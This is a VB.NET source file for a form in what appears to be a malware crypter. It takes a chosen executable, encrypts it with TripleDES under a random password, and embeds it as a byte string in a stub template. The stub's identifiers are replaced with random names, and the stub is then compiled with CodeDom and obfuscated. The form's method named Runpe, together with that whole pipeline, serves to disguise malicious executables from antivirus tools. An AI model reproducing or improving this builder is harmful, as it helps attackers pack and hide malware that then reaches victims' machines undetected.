Imports System.IO
Imports System.Reflection
Imports Microsoft.VisualBasic.CompilerServices
Imports System.CodeDom.Compiler
Imports System.Text
Imports System.Runtime.InteropServices
Imports System.Security
Imports System.Security.Cryptography
Imports System.Threading
Imports ICSharpCode.SharpZipLib.Zip
Imports System.IO.Compression
Public Class frmPrivate
#Region "DOTNET"
    Public Shared Function DotNet(bytesdotnet As Byte()) As Boolean
        Dim result As Boolean
        Try
            Assembly.Load(bytesdotnet)
            result = True
        Catch ex As Exception
            result = False
        End Try
        Return result
    End Function
#End Region
#Region "ENCRYPTION"
    Public Shared Function About(ByRef data As Byte(), ByRef pass As String)
        Dim a As New System.Security.Cryptography.MD5CryptoServiceProvider()
        Dim i As Byte() = a.ComputeHash(System.Text.ASCIIEncoding.Unicode.GetBytes(pass))
        Dim s As New System.Security.Cryptography.TripleDESCryptoServiceProvider()
        s.Key = i
        s.Mode = System.Security.Cryptography.CipherMode.ECB
        Return s.CreateEncryptor().TransformFinalBlock(data, 0, data.Length)
    End Function
    Public Function Runpe(ByRef data As Byte()) As Object
        Dim a As New System.Text.StringBuilder()
        Dim s As Byte() = About(data, GunaTextBox2.Text)
        For i As Integer = 0 To s.Length - 1
            Dim x As Byte = s(i)
            a.Append(x)
            a.Append(",")

        Next
        Return a.ToString().Remove(a.Length - 1)
    End Function
#End Region
    Private Sub frmPrivate_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Guna.UI.Lib.GraphicsHelper.ShadowForm(Me)
        GunaTextBox2.Text = Randomization.RandomPassword.Generate(35, 35)
    End Sub

    Private Sub GunaButton1_Click(sender As Object, e As EventArgs) Handles GunaButton1.Click
        Dim Open As New OpenFileDialog
        Open.Filter = "Executable Files (*.exe)|*.exe"
        If Open.ShowDialog = vbOK Then
            TextBox1.Text = Open.FileName
            If DotNet(File.ReadAllBytes(Open.FileName)) Then
                Label10.Text = ".NET File"
            Else
                Label10.Text = "Native File"
            End If
            Dim FileInfo As FileInfo = New FileInfo(Open.FileName)
            Dim Num As Integer = CInt(FileInfo.Length)
            Me.Label12.Text = Conversions.ToString(CDbl(Num) / 1000.0) + " KB"
        End If

    End Sub
    Dim vcFUoknuUGOaxmFuhuaHnywrk As String
    Private Sub GunaButton3_Click(sender As Object, e As EventArgs) Handles GunaButton3.Click
        If TextBox1.Text = "" Then

        Else
            Dim Save As New SaveFileDialog
            Save.Filter = "Executable Files (*.exe)|*.exe"
            Save.FileName = ""
            If Save.ShowDialog = vbOK Then
                Dim zRKeGcaxgOwevQcLbXlnMPLUg As Byte() = IO.File.ReadAllBytes(TextBox1.Text)
                Dim TcedkgPxAgCFAbRalKelOqNQO As String = Runpe(zRKeGcaxgOwevQcLbXlnMPLUg)
                Dim nbsaWumrcpYk As String = My.Resources._Private
                nbsaWumrcpYk = nbsaWumrcpYk.Replace("%1%", frmMain.RandomString()).Replace("%2%", frmMain.RandomString()).Replace("%3%", frmMain.RandomString()).Replace("%4%", frmMain.RandomString()).Replace("%5%", frmMain.RandomString()).Replace("%28%", frmMain.RandomString()).Replace("%6%", frmMain.RandomString()).Replace("%7%", frmMain.RandomString()).Replace("%8%", frmMain.RandomString()).Replace("%9%", frmMain.RandomString()).Replace("%10%", frmMain.RandomString()).Replace("%11%", frmMain.RandomString()).Replace("%12%", frmMain.RandomString()).Replace("%13%", frmMain.RandomString()).Replace("%14%", frmMain.RandomString()).Replace("%15%", frmMain.RandomString()).Replace("%16%", frmMain.RandomString()).Replace("%17%", frmMain.RandomString()).Replace("%18%", frmMain.RandomString()).Replace("%19%", frmMain.RandomString()).Replace("%20%", frmMain.RandomString()).Replace("%21%", frmMain.RandomString()).Replace("%22%", frmMain.RandomString()).Replace("%23%", frmMain.RandomString()).Replace("%24%", frmMain.RandomString()).Replace("%25%", frmMain.RandomString()).Replace("%44%", frmMain.RandomString()).Replace("%26%", frmMain.RandomString()).Replace("%35%", frmMain.RandomString()).Replace("%36%", frmMain.RandomString()).Replace("%37%", frmMain.RandomString()).Replace("%29%", frmMain.RandomString()).Replace("%27%", frmMain.RandomString()).Replace("%90%", frmMain.RandomString()).Replace("%Atom%", RichTextBox2.Text).Replace("%30%", frmMain.RandomString()).Replace("%31%", frmMain.RandomString()).Replace("%34%", frmMain.RandomString()).Replace("%32%", frmMain.RandomString()).Replace("%Razor%", TcedkgPxAgCFAbRalKelOqNQO).Replace("%Password%", GunaTextBox2.Text)
                vcFUoknuUGOaxmFuhuaHnywrk = nbsaWumrcpYk

                frmMain.Codedom(Save.FileName, vcFUoknuUGOaxmFuhuaHnywrk, Nothing)
                Confuser.Obfuscate(Save.FileName)
                File.Delete(Save.FileName)
                RichTextBox1.Text = ""
            End If
        End If
    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub GunaButton4_Click(sender As Object, e As EventArgs) Handles GunaButton4.Click
        GunaTextBox2.Text = Randomization.RandomPassword.Generate(35, 35)
    End Sub

    Private Sub GunaTextBox2_TextChanged(sender As Object, e As EventArgs) Handles GunaTextBox2.TextChanged

    End Sub
End Class